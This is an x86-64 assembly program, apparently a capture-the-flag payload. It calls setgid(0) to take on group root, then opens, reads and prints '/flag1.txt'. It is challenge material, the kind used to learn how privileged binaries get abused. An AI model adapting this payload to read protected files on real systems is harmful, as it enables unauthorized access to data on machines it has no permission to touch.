section .data
    filename db '/flag1.txt', 0

section .text
    global _start

_start:
    mov rax, 106        ; syscall number for setgid
    mov rdi, 0
    syscall

    mov rax, 2          ; syscall number for open
    lea rdi, [rel filename]
    mov rsi, 0
    mov rdx, 0
    syscall

    test rax, rax
    js exit_error

    mov r8, rax

    sub rsp, 1024       ; 缓冲区
    mov rsi, rsp        ; 缓冲区
    mov rdx, 1024
    mov rax, 0          ; syscall number for read
    mov rdi, r8
    syscall

    test rax, rax
    js close_exit       ; 错误
    jz close_exit       ; 0字节

    mov rdx, rax
    mov rax, 1          ; syscall number for write
    mov rdi, 1          ; stdout
    syscall

close_exit:
    mov rax, 3          ; syscall number for close
    mov rdi, r8
    syscall

exit:
    mov rax, 60         ; syscall number for exit
    xor rdi, rdi
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1
    syscall